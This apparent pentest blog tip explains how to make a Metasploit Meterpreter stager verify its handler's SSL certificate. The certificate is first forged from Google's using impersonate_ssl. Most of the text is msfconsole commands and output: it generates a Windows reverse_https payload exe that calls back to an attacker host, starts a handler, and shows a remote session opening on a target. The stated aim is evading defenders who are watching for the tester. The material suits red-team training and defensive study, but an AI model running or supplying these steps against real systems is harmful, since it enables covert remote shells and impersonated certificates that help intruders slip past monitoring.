
## Tip: Meterpreter SSL Certificate Validation

Have you ever been in a pentest where the defenders know their stuff and are actively looking to detect and sabotage all of your actions? If not I can say only one thing, it changes the way you approach, plan and execute a penetration test drastically.

I want to share a simple tip on how to secure your initial staged connection for Meterpreter by having it check the certificate of the listener it is connecting to.

We start by generating a certificate in PEM format. Thankfully there is a module for that create by Chris John Riley called impersonate_ssl that will generate one based on the information it gathers from the certificate of a website specified in the RHOST parameter of the module. This allows me to make my cert look almost legitimately. In the Following example I will use Googles SSL cert as my base for my fake one.

    msf > use auxiliary/gather/impersonate_ssl 
    msf auxiliary(impersonate_ssl) > set RHOST www.google.com
    RHOST => www.google.com
    msf auxiliary(impersonate_ssl) > run

    [*] Connecting to www.google.com:443
    [*] Copying certificate from www.google.com:443
    /C=US/ST=California/L=Mountain View/O=Google Inc/CN=google.com 
    [*] Beginning export of certificate files
    [*] Creating looted key/crt/pem files for www.google.com:443
    [+] key: /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_k_189227.key
    [+] crt: /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_c_767214.crt
    [+] pem: /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_p_507862.pem
    [*] Auxiliary module execution completed
    msf auxiliary(impersonate_ssl) > 

Once the certs have been created I can create a HTTP or HTTPS payload for it and give it the path of PEM format certificate to be used to validate the connection. To have the connection validated we need to first tell the payload what certificate the handler will be using by setting the path to the PEM formatted certificate in the HANDLERSSLCERT option then we enable checking of this certificate by setting stagerverifysslcert to true.

    msf > use payload/windows/meterpreter/reverse_http
    msf payload(reverse_http) > set stagerverifysslcert true
    stagerverifysslcert => true
    msf payload(reverse_http) > use payload/windows/meterpreter/reverse_https
    msf payload(reverse_https) > set stagerverifysslcert true
    stagerverifysslcert => true
    msf payload(reverse_https) > set HANDLERSSLCERT /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_p_507862.pem
    HANDLERSSLCERT => /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_p_507862.pem
    msf payload(reverse_https) > set LHOST 192.168.1.211
    LHOST => 192.168.1.211
    msf payload(reverse_https) > set LPORT 8081
    LPORT => 8081
    msf payload(reverse_https) > generate -t exe -f /tmp/payload1.exe
    [*] Writing 73802 bytes to /tmp/payload1.exe...

Once that exe is created I need to create a handler to receive the connection and again I use the PEM style certificate so the handler can use the SHA1 hash for validation. Just like with the Payload we set the parameters HANDLERSSLCERT with the path to the PEM file and stagerverifysslcert to true.

    msf payload(reverse_https) > use exploit/multi/handler 
    msf exploit(handler) > set LHOST 192.168.1.211
    LHOST => 192.168.1.211
    msf exploit(handler) > set LPORT 8081
    LPORT => 8081
    msf exploit(handler) > set HANDLERSSLCERT /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_p_507862.pem
    HANDLERSSLCERT => /home/carlos/.msf4/loot/20150611074516_default_24.41.214.170_www.google.com_p_507862.pem
    msf exploit(handler) > set stagerverifysslcert true
    stagerverifysslcert => true
    msf exploit(handler) > exploit -j

    [*] Meterpreter will verify SSL Certificate with SHA1 hash 5fefcc6cae228b92002a6d168c5a78d495d8c884
    [*] Exploit running as background job.

When we get execution of the payload on a target we can see the stage doing the validation when it sets up the session.

    msf exploit(handler) > [*] Starting the payload handler...
    [*] 192.168.1.104:56107 (UUID: db09abc1d1831687/x86=1/windows=1/2015-06-11T12:28:50Z) Staging Native payload ...
    [*] Meterpreter will verify SSL Certificate with SHA1 hash 5fefcc6cae228b92002a6d168c5a78d495d8c884
    [*] Meterpreter session 1 opened (192.168.1.211:8081 -> 192.168.1.104:56107) at 2015-06-11 08:28:51 -0400

